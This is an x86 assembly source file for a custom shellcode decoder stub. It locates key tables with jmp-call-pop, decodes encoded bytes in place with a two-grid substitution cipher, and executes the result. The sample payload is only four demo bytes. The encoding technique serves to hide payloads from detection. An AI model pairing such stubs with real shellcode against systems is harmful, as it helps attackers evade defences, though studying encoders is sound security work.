global _start

section kode write exec 	; Thank you Frank Kotler

_start:
	jmp call_decoder

subForZero:
	mov al, 0xAA
	ret

decoder:
	pop esi			; esi = key1 ; esi +16 = key2 ; esi +32 = encoded shellcode
	xor eax, eax
	xor ecx, ecx
	mov ecx, 0x20
	xor edx, edx

loop0:
	xor ebx, ebx	
	mov al, [esi+ecx]	; get the hex pair
	cmp al, 0x0
	jz Shellcode		; If were at the end of the string, exec shellcode
	
	push ecx
	xor ecx, ecx
	mov cl, 0x10
	shr al, 4		; we just want the higher order bits 
	jnz loop1
	call subForZero

loop1:
	dec cl
	mov bl, [esi+ecx]
	cmp eax, ebx
	je found1
	cmp cl, 0x0
	jge loop1
found1:
	mov eax, ecx		
	mov ecx, 0x04
	idiv cl  		; al = quotient (row1), ah = remainder (col1)
	
	pop ecx
	push eax
	xor eax, eax
	mov al, [esi+ecx] 	; get the hex pair again
	push ecx
	xor ecx, ecx 
	mov cl, 0x10
	and al, 0x0f		; make higher order bits 0000.
	jnz loop2
	call subForZero

loop2:
	dec cl
	mov bl, [esi+16+ecx]	
	cmp eax, ebx
	je found2	
	cmp cl, 0x0
	jge loop2
found2:
	mov eax, ecx
	mov ecx, 0x4
	idiv cl			;al = quotient (row2), ah = remainder (col2)
	mov ebx, eax		;bl = row2, bh = col2
	
	pop ecx
	pop eax			;al = row1, ah = col1
	push ecx		
	mov edx, eax		;dl = row1, dh = col1
	mov ah, 0x00		;ax = row1
	
	mov ecx, 0x4	
	mul cl			;mult row1 by 0x4
	add al, bh		;add col2 ; ax = decoded hexidecimal 1
	shl al, 4		;shift one hex place, ie 4 bits
	mov edi, eax		;edi = decoded hexidecinal 1
 
	mov eax, ebx		;al = row2, ah = col2
	mov ah, 0x00		;ax = row2
	mul cl			;mult row2 by 0x4
	add al, dh		;add col1; ax = decoded hexidecimal 2
	add eax, edi		;eax = decoded hex pair	

write:	
	pop ecx
	mov [esi + ecx], al
	inc ecx
	jmp loop0

	
call_decoder:
	call decoder
        Shellcode: db 0xAA,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0xAA,0x02,0x0b,0x04,0x03,0x06,0x05,0x08,0x07,0x0a,0x09,0x01,0x0c,0x0e,0x0d,0x0f,0xbc,0x23,0x9a,0x80


;0 a b c	0 1 2 3 
;d e f 1 	4 5 6 7
;2 3 4 5 	8 9 A B
;6 7 8 9	C D E F

;0 1 2 3	0 2 b 4	
;4 5 6 7	3 6 5 8
;8 9 A B	7 A 9 1
;C D E F	C E D F

; Decode:
; 0xbc 0x23 0x9a 0x80 = 0x0e 0x84 0xdb 0xc2

